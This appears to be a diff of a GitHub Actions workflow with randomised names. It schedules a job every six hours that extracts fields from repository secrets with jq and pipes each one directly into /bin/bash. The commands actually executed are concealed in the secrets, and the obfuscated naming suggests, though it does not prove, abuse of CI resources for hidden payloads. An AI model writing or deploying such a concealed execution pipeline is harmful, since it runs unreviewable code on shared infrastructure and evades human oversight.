@@ -1,19 +1,21 @@
 name: shucixinazoa
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 4/6 * * *'
-
+    - cron: '41 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shucixinazoa
         env:
-          w7: ${{ secrets.w7 }}
+          t27105: ${{ secrets.t27105 }}
         run: |
-          echo $w7 | jq -r .i08988 | /bin/bash
-          echo $i70 | jq -r .i4 | /bin/bash
+          echo $t27105 | jq -r .kcb918 | /bin/bash
+          echo $aatjh80 | jq -r .plkbv04669 | /bin/bash
+          echo $zjzgu40086 | jq -r .rx924 | /bin/bash
+          echo $sac52 | jq -r .od4912 | /bin/bash
+          echo $i9311 | jq -r .nlnsx814 | /bin/bash
 
